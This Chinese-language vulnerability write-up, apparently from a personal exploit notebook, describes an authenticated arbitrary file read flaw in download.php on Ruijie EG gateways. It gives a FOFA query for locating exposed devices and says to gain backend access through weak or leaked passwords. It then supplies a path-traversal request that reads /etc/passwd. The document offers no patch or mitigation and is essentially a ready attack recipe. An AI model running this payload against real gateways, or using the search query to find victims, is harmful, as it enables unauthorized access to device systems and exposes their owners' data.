# 锐捷EG易网关download.php后台任意文件读取漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷EG易网关download.php后台任意文件读取漏洞 </font>

**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

锐捷 EG易网关  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**  
<font style="color:rgb(38, 38, 38);">●登录页面</font>

<font style="color:rgb(38, 38, 38);">fofa:</font>`app="Ruijie-EG易网关" `

![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/cg41HdOksJkEBK3T/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-093813.webp)

![1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48.png](./img/cg41HdOksJkEBK3T/1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48-161741.png)

  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1通过弱口令或账号密码泄露漏洞登录后台获取cookie  


![1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png](./img/cg41HdOksJkEBK3T/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-847404.webp)

2通过上一步获取的cookie执行

```plain
/download.php?a=read_txt&file=../../../../etc/passwd
```

![1711946009120-be7d5122-2ffc-4924-bd6c-4f4a8758dc0c.png](./img/cg41HdOksJkEBK3T/1711946009120-be7d5122-2ffc-4924-bd6c-4f4a8758dc0c-947085.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ecv5820erlgsur8o>